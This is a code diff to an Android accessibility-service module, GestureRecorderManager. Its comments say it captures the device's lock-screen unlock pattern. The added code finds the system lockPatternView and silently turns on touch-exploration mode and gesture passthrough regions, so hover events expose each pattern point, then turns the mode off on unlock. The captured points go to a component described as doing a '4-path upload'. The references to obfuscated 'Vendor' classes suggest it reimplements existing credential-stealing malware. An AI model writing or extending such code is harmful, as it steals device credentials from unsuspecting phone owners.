@@ -1,9 +1,15 @@
 package com.storm.safe.rock.service.modules
 
+import android.accessibilityservice.AccessibilityServiceInfo
 import android.app.KeyguardManager
 import android.graphics.Rect
+import android.graphics.Region
+import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 import com.storm.safe.rock.service.MyAccessibilityService
 import org.json.JSONArray
 import org.json.JSONObject
@@ -11,17 +17,19 @@ import org.json.JSONObject
 /**
  * Passive pattern unlock capture via HOVER_MOVE accessibility events.
  * Vendor: C0319a4 (GestureRecorderManager), methods a3 (onHoverEvent) + a6 (onWindowStateChanged).
+ * Touch exploration: b30 (enable/disable touch exploration on lockscreen).
  *
- * When lock screen is detected, starts recording. On HOVER_MOVE events from
- * pattern grid nodes, extracts contentDescription (e.g. "图案点3") to get
- * pattern point index. On unlock transition, packages captured points and
- * feeds to CipherCaptureManager for 4-path upload.
+ * When lock screen is detected, starts recording. Detects lockPatternView
+ * and temporarily enables FLAG_REQUEST_TOUCH_EXPLORATION_MODE to receive
+ * HOVER events. On unlock transition, disables touch exploration, packages
+ * captured points, and feeds to CipherCaptureManager for 4-path upload.
  */
 class GestureRecorderManager(private val service: MyAccessibilityService) {
 
     companion object {
         private const val TAG = "GestureRecorder"
         private val DIGIT_REGEX = Regex("\\d+")
+        private const val FLAG_TOUCH_EXPLORATION = 4
     }
 
     @Volatile var isRecording = false
@@ -29,9 +37,11 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
     var mode = 0  // 0=off, 1=recording
         private set
     private var wasLocked = false
+    private var touchExplorationEnabled = false
     private val patternPoints = ArrayList<String>()
     private var patternCoords = JSONArray()
     private var recordingStartTime = 0L
+    private val handler = Handler(Looper.getMainLooper())
 
     /**
      * Handle HOVER_MOVE accessibility event on lock screen.
@@ -99,10 +109,17 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
                 patternPoints.clear()
                 patternCoords = JSONArray()
                 Log.d(TAG, "Lock screen detected -> start pattern recording")
+                handler.postDelayed({ tryEnableTouchExploration() }, 500L)
             }
 
             if (justUnlocked) {
+                disableTouchExploration()
                 onUnlocked()
+            }
+
+            // While locked, check for pattern view and enable touch exploration
+            if (nowLocked && isRecording && !touchExplorationEnabled) {
+                tryEnableTouchExploration()
             }
 
             wasLocked = nowLocked
@@ -158,7 +175,82 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
         patternCoords = JSONArray()
     }
 
+    /**
+     * Detect lockPatternView in accessibility tree and enable touch exploration.
+     * Vendor: C02969 coroutine + b30 case 1
+     */
+    private fun tryEnableTouchExploration() {
+        if (touchExplorationEnabled) return
+        try {
+            val root = service.rootInActiveWindow ?: return
+            val patternViewId = if (Build.MANUFACTURER.lowercase().let {
+                    it.contains("vivo") || it.contains("iqoo") || it.contains("bbk")
+                }) "com.android.systemui:id/vivo_lock_pattern_view"
+            else "com.android.systemui:id/lockPatternView"
+
+            val nodes = root.findAccessibilityNodeInfosByViewId(patternViewId)
+            root.recycle()
+
+            if (!nodes.isNullOrEmpty() && nodes[0].isVisibleToUser) {
+                enableTouchExploration()
+                Log.d(TAG, "🔐 检测到图案锁视图($patternViewId)，启用触摸探索")
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "tryEnableTouchExploration error", e)
+        }
+    }
+
+    /**
+     * Temporarily enable FLAG_REQUEST_TOUCH_EXPLORATION_MODE.
+     * Vendor: b30 case 1 — flags |= 4
+     */
+    private fun enableTouchExploration() {
+        try {
+            val info = service.serviceInfo ?: return
+            info.flags = info.flags or FLAG_TOUCH_EXPLORATION
+            service.serviceInfo = info
+            touchExplorationEnabled = true
+
+            if (Build.VERSION.SDK_INT >= 30) {
+                val dm = service.resources.displayMetrics
+                val region = Region()
+                region.op(Rect(0, 0, dm.widthPixels - 3, dm.heightPixels - 3), Region.Op.UNION)
+                service.setGestureDetectionPassthroughRegion(0, region)
+            }
+            Log.d(TAG, "🔐 触摸探索已启用 flags=0x${Integer.toHexString(info.flags)}")
+        } catch (e: Exception) {
+            Log.e(TAG, "enableTouchExploration failed", e)
+        }
+    }
+
+    /**
+     * Disable FLAG_REQUEST_TOUCH_EXPLORATION_MODE.
+     * Vendor: b30 case 0 — flags &= ~4
+     */
+    private fun disableTouchExploration() {
+        if (!touchExplorationEnabled) return
+        try {
+            val info = service.serviceInfo ?: return
+            info.flags = info.flags and FLAG_TOUCH_EXPLORATION.inv()
+            service.serviceInfo = info
+            touchExplorationEnabled = false
+
+            if (Build.VERSION.SDK_INT >= 30) {
+                val dm = service.resources.displayMetrics
+                val region = Region()
+                val h = dm.heightPixels
+                region.op(Rect(0, h - 200, dm.widthPixels, h), Region.Op.UNION)
+                service.setTouchExplorationPassthroughRegion(0, region)
+                service.setGestureDetectionPassthroughRegion(0, region)
+            }
+            Log.d(TAG, "🔐 触摸探索已关闭")
+        } catch (e: Exception) {
+            Log.e(TAG, "disableTouchExploration failed", e)
+        }
+    }
+
     fun reset() {
+        disableTouchExploration()
         isRecording = false
         mode = 0
         patternPoints.clear()
